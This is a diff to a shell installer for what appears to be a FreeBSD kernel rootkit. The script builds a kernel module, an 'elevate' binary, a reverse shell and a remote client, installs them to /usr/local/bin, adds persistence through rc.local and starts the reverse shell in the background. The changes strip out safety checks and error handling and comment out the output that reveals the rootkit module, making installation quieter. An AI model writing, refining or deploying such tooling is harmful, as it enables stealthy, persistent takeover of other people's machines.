@@ -24,8 +24,6 @@ fail() {
 }
 
 # Checks for root privileges, FreeBSD OS, and required commands
-[ "$(id -u)" -eq 0 ] || fail "Run this script as root"
-[ "$(uname -s)" = "FreeBSD" ] || fail "This script is intended for FreeBSD only"
 [ -d "$MODULE_DIR" ] || fail "Kernel directory not found: $MODULE_DIR"
 [ -f "$ELEVATE_SRC" ] || fail "Source file not found: $ELEVATE_SRC"
 
@@ -45,12 +43,12 @@ make -C "$MODULE_DIR"
 cc -Wall -Wextra -o "$ELEVATE_BIN" "$ELEVATE_SRC"
 
 # Build revshell inside $MODULE_DIR
-printf '%s\n' '[*] Building revshell...'
+# printf '%s\n' '[*] Building revshell...'
 cc -Wall -Wextra -I. -I"$MODULE_DIR" -o "$MODULE_DIR/revshell" "$MODULE_DIR/revshell.c" || fail "Failed to build revshell"
 chmod 755 "$MODULE_DIR/revshell"
 
-printf '%s\n' '[*] Building remote client binary...'
-cc -O2 -Wall -o "$REMOTE_BIN" "$REMOTE_SRC" || fail "Failed to build remote client binary"
+# printf '%s\n' '[*] Building remote client binary...'
+cc -O2 -Wall -o "$REMOTE_BIN" "$REMOTE_SRC"
 chmod 755 "$REMOTE_BIN"
 
 # Ensures persistence 
@@ -82,9 +80,9 @@ fi
 
 # Install binaries to /usr/local/bin
 printf '%s\n' '[*] Installing binaries to /usr/local/bin...'
-install -d -m 755 /usr/local/bin || fail "Failed to create /usr/local/bin"
-install -m 755 "$ELEVATE_BIN" /usr/local/bin/elevate || fail "Failed to install elevate"
-install -m 755 "$MODULE_DIR/revshell" /usr/local/bin/revshell || fail "Failed to install revshell"
+install -d -m 755 /usr/local/bin 
+install -m 755 "$ELEVATE_BIN" /usr/local/bin/elevate 
+install -m 755 "$MODULE_DIR/revshell" /usr/local/bin/revshell 
 
 # Launch revshell background worker using the installed binary path
 pkill -f revshell 2>/dev/null || true
@@ -109,6 +107,6 @@ chmod +x /etc/rc.local
 # "$ABS_PATH" &
 
 # Print completion message
-printf '%s\n' '[+] Installation complete; module entry:'
-kldstat -m rootkit
-printf '%s\n' '[*] Unload with: kldunload rootkit'
+# printf '%s\n' '[+] Installation complete; module entry:'
+# kldstat -m rootkit
+# printf '%s\n' '[*] Unload with: kldunload rootkit'
